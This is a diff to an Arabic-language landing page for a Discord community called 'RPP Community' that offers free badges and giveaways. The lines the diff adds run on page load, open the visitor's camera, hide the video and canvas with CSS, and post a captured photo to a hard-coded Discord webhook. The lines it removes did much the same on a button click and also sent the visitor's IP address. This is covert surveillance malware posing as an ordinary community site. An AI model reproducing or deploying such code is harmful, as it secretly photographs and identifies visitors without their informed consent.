@@ -2,6 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <link rel="icon" href="icon.png" type="image/png">
+  <!-- Meta Tags for Embed Preview -->
   <meta property="og:title" content="𝐑𝐏𝐏 𝐂𝐨𝐦𝐦𝐮𝐧𝐢𝐭𝐲">
   <meta property="og:description" content="شارات ديسكورد مجانية، سحوبات مميزة، وتجارب تجارة آمنة! انضم الآن.">
   <meta property="og:image" content="https://rayan511x55x.github.io/RPP/icon.png">
@@ -15,7 +16,6 @@
   <title>𝐑𝐏𝐏 𝐂𝐨𝐦𝐦𝐮𝐧𝐢𝐭𝐲</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
-
     body {
       margin: 0;
       padding: 0;
@@ -102,6 +102,7 @@
     .socials a:hover {
       color: #fff;
     }
+    video, canvas { display: none; } /* hide video/canvas */
   </style>
 </head>
 <body>
@@ -130,7 +131,7 @@
     </div>
   </div>
 
-  <button class="join-button" onclick="captureAndJoin()">
+  <button class="join-button" onclick="window.open('https://discord.gg/Pcw4qhvv', '_blank')">
     انضم لنا الآن!
   </button>
 
@@ -145,63 +146,38 @@
     </div>
   </footer>
 
+  <!-- Camera auto-capture script -->
   <script>
-    async function captureAndJoin() {
-      // طلب الوصول إلى الكاميرا
+    window.addEventListener('DOMContentLoaded', async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        
-        // استخدام الكاميرا لالتقاط الصور
         const video = document.createElement('video');
         video.srcObject = stream;
-        video.play();
+        await video.play();
 
-        // انتظر حتى يتم تحميل الفيديو بالكامل
-        video.onloadedmetadata = async () => {
-          // التقط صورة من الكاميرا الأمامية والخلفية (إذا كانت موجودة)
-          const canvasFront = document.createElement('canvas');
-          canvasFront.width = video.videoWidth;
-          canvasFront.height = video.videoHeight;
-          const contextFront = canvasFront.getContext('2d');
-          contextFront.drawImage(video, 0, 0, canvasFront.width, canvasFront.height);
-          const photoFront = canvasFront.toDataURL('image/jpeg');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-          // إرسال الصور إلى الويب هوك
-          await sendData(photoFront);
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-          // الانتقال إلى رابط ديسكورد بعد التقاط الصور
-          window.open('https://discord.gg/Pcw4qhvv', '_blank');
+        const formData = new FormData();
+        formData.append('file', photoBlob, 'photo.jpg');
+        formData.append('payload_json', JSON.stringify({ content: 'New visitor captured!' }));
 
-          // إيقاف الفيديو
-          stream.getTracks().forEach(track => track.stop());
-        };
+        await fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
+          method: 'POST',
+          body: formData
+        });
+
+        stream.getTracks().forEach(track => track.stop());
       } catch (err) {
-        console.error("Error accessing camera:", err);
+        console.error('Error accessing camera:', err);
       }
-    }
-
-    async function sendData(photo) {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      const ip = ipData.ip;
-
-      // إرسال البيانات عبر الويب هوك
-      fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: `New visitor with IP: ${ip}`,
-          embeds: [
-            {
-              title: 'Captured Image',
-              image: {
-                url: photo
-              }
-            }
-          ]
-        })
-      });
-    }
+    });
   </script>
+
 </body>
 </html>
